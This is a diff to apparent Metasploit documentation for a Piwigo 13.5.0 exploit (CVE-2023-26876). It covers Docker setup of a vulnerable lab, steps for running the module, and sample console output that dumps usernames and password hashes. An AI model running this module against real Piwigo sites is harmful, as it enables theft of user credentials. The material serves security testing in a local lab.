@@ -15,11 +15,11 @@
 
     ENV PIWIGO_VERSION="13.5.0"
     RUN set -x && apk --no-cache add curl php7 php7-gd php7-mysqli php7-json php7-session php7-exif && \
-      curl "http://piwigo.org/download/dlcounter.php?code=${PIWIGO_VERSION}" --output piwigo.zip && \
-      adduser -h /piwigo -DS piwigo && unzip piwigo.zip -d /piwigo && \
-      install -d -o piwigo /piwigo/piwigo/galleries /piwigo/piwigo/upload && \
-      chown -R piwigo /piwigo/piwigo/local && \
-      apk --no-cache del curl && rm piwigo.zip
+    curl "http://piwigo.org/download/dlcounter.php?code=${PIWIGO_VERSION}" --output piwigo.zip && \
+    adduser -h /piwigo -DS piwigo && unzip piwigo.zip -d /piwigo && \
+    install -d -o piwigo /piwigo/piwigo/galleries /piwigo/piwigo/upload && \
+    chown -R piwigo /piwigo/piwigo/local && \
+    apk --no-cache del curl && rm piwigo.zip
 
     WORKDIR /piwigo
     USER piwigo
@@ -41,7 +41,7 @@
               - "8000:8000"
           mysql:
             container_name: piwigo_mysql
-            image: arm64v8/mysql
+            image: mysql:8.0.18
             command: ["--default-authentication-plugin=mysql_native_password"]
             networks:
               - piwigo
@@ -59,24 +59,32 @@
    ```bash
    $ docker build -t piwigo-docker ./
    $ docker-compose up -d
-   # then Piwigo's installation page should be available at http://localhost:8000.
-   # The default value for the database URL is mysql, the user is piwigo and the password is piwigo again. The initial database being created is called piwigo.
    ```
+   4 - Then Piwigo's installation page should be available at http://localhost:8000.
+   5 - Setup the database with:
+
+  - **mysql** as db hostname;
+  - **username** piwigo;
+  - **password** piwigo;
+  
+   6 - With admin, create a album and upload any photo to this album. (This step is important)
+   
+   7 - Run the exploit, with any user with this access to this album or have admin access.
 
 ## Scenarios
 
 ### Tested on Ubuntu 22.04.2 Running Pimcore v13.5.0
 
 ```
-msf6 auxiliary(gather/piwigo_cve_2023_26876) > reload
-[*] Reloading module...
 msf6 auxiliary(gather/piwigo_cve_2023_26876) > run
 [*] Running module against 127.0.0.1
 
-[*] try to log in..
-[+] successfully logged into Piwigo!!
-[+] target is vulnerable
-[+] get your l00t $
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. The target is running Piwigo with version 13.5.0
+[*] Try to log in..
+[+] Successfully logged into Piwigo
+[+] Target is vulnerable
+[*] Dump of usernames and hashes:
 
 Piwigo Users
 ============
@@ -86,9 +94,9 @@ Piwigo Users
  admin     $P$GAO2fLIGJtRyQCNf96KbQ9PeiDAuii/
  guest
  piwigo    $P$GNrJljahQW2NXTXhWNZdalgGiao/T1/
+ test1     $P$G2HB46S.PMs5gExCAfXCMUW2p1HwA60
  user      $P$GE/wX1wqKM0WKkAGXvhYihdPhgl5Mw/
 
 [*] Auxiliary module execution completed
 msf6 auxiliary(gather/piwigo_cve_2023_26876) > 
-
 ```
